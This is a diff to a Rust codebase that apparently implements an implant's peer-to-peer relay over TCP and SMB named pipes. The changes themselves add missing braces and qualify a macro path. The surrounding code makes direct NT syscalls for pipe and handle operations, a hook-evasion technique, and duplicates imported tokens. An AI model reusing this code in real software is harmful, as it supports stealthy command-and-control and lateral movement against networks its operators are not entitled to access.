@@ -1590,6 +1590,7 @@ pub async fn handle_route_probe(
             P2pTransport::TcpStream(handle_arc) => {
                 let mut handle = handle_arc.lock().await;
                 handle.write_frame(&frame).await?;
+            }
             #[cfg(all(windows, feature = "smb-pipe-transport"))]
             P2pTransport::SmbPipe(ref pipe) => {
                 nt_pipe_server::NtPipeHandle::write_frame(pipe, &frame)?;
@@ -1850,6 +1851,7 @@ pub async fn handle_bandwidth_probe(
         P2pTransport::TcpStream(handle_arc) => {
             let mut handle = handle_arc.lock().await;
             handle.write_frame(&frame).await?;
+        }
         #[cfg(all(windows, feature = "smb-pipe-transport"))]
         P2pTransport::SmbPipe(ref pipe) => {
             nt_pipe_server::NtPipeHandle::write_frame(pipe, &frame)?;
@@ -3064,6 +3066,7 @@ pub fn spawn_child_relay(
                                         P2pTransport::TcpStream(handle_arc) => {
                                             let mut h = handle_arc.lock().await;
                                             h.encrypt_write_frame(&ack_frame, &key).await
+                                        }
                                         #[cfg(all(windows, feature = "smb-pipe-transport"))]
                                         P2pTransport::SmbPipe(ref pipe) => {
                                             let encrypted =
@@ -3077,6 +3080,7 @@ pub fn spawn_child_relay(
                                             nt_pipe_server::NtPipeHandle::write_frame(
                                                 pipe, &enc_frame,
                                             )
+                                        }
                                         _ => Err(anyhow::anyhow!("unsupported transport")),
                                     };
                                     if let Err(e) = write_res {
@@ -4410,6 +4414,7 @@ pub mod tcp_transport {
                 payload_len,
                 payload,
             })
+        }
 
         /// Write a complete `P2pFrame` to the TCP stream.
         ///
@@ -4815,6 +4820,7 @@ pub mod tcp_transport {
                         "LinkAccept payload too short: {} < 32",
                         resp_frame.payload.len()
                     ));
+                }
                 let mut parent_pubkey = [0u8; 32];
                 parent_pubkey.copy_from_slice(&resp_frame.payload[..32]);
 
@@ -5062,6 +5068,7 @@ pub mod nt_pipe_server {
                 payload_len,
                 payload,
             })
+        }
 
         /// Write a complete `P2pFrame` to the pipe.
         pub fn write_frame(&self, frame: &P2pFrame) -> Result<()> {
@@ -5122,7 +5129,7 @@ pub mod nt_pipe_server {
         //   PipeHandle, DesiredAccess, ObjectAttributes, IoStatusBlock,
         //   ReadMode, CompletionMode, MaximumInstances,
         //   InboundQuota, OutboundQuota, DefaultTimeout, Timeout
-        let status = syscall!(
+        let status = crate::syscall!(
             "NtCreateNamedPipeFile",
             &mut handle as *mut _ as u64,
             (GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE) as u64,
@@ -5150,7 +5157,7 @@ pub mod nt_pipe_server {
     /// `NtFsControlFile` with `FSCTL_PIPE_LISTEN`.
     unsafe fn pipe_listen(handle: *mut std::ffi::c_void) -> Result<()> {
         let mut iosb: winapi::shared::ntdef::IO_STATUS_BLOCK = std::mem::zeroed();
-        let status = syscall!(
+        let status = crate::syscall!(
             "NtFsControlFile",
             handle as u64,                              // FileHandle
             0u64,                                        // Event
@@ -5177,7 +5184,7 @@ pub mod nt_pipe_server {
     /// Read bytes from a file handle via `NtReadFile` (NT direct syscall).
     unsafe fn read_file(handle: *mut std::ffi::c_void, buf: &mut [u8]) -> Result<usize> {
         let mut iosb: winapi::shared::ntdef::IO_STATUS_BLOCK = std::mem::zeroed();
-        let status = syscall!(
+        let status = crate::syscall!(
             "NtReadFile",
             handle as u64,
             0u64,
@@ -5203,7 +5210,7 @@ pub mod nt_pipe_server {
     /// Write bytes to a file handle via `NtWriteFile` (NT direct syscall).
     unsafe fn write_file(handle: *mut std::ffi::c_void, buf: &[u8]) -> Result<usize> {
         let mut iosb: winapi::shared::ntdef::IO_STATUS_BLOCK = std::mem::zeroed();
-        let status = syscall!(
+        let status = crate::syscall!(
             "NtWriteFile",
             handle as u64,
             0u64,
@@ -5228,7 +5235,7 @@ pub mod nt_pipe_server {
 
     /// Close a handle via `NtClose` (NT direct syscall).
     unsafe fn close_handle(handle: *mut std::ffi::c_void) -> Result<()> {
-        let status = syscall!("NtClose", handle as u64)
+        let status = crate::syscall!("NtClose", handle as u64)
             .map_err(|e| anyhow!("nt_syscall resolution for NtClose: {e}"))?;
         if status < 0 {
             return Err(anyhow!("NtClose failed: NTSTATUS {:#010X}", status as u32));
@@ -5287,7 +5294,7 @@ pub mod nt_pipe_server {
         let mut iosb: winapi::shared::ntdef::IO_STATUS_BLOCK = std::mem::zeroed();
         let mut handle: *mut std::ffi::c_void = std::ptr::null_mut();
 
-        let status = syscall!(
+        let status = crate::syscall!(
             "NtOpenFile",
             &mut handle as *mut _ as u64,                 // FileHandle
             (GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE) as u64, // DesiredAccess
@@ -5424,6 +5431,7 @@ pub mod nt_pipe_server {
                         "LinkAccept payload too short: {} < 32",
                         resp_frame.payload.len()
                     ));
+                }
                 let mut parent_pubkey = [0u8; 32];
                 parent_pubkey.copy_from_slice(&resp_frame.payload[..32]);
 
@@ -5661,7 +5669,7 @@ pub mod nt_pipe_server {
                                     }
                                 }
                                 // Close the original token — import_token duplicates it.
-                                let _ = syscall!("NtClose", token as u64);
+                                let _ = crate::syscall!("NtClose", token as u64);
                             }
                         } else {
                             log::debug!(
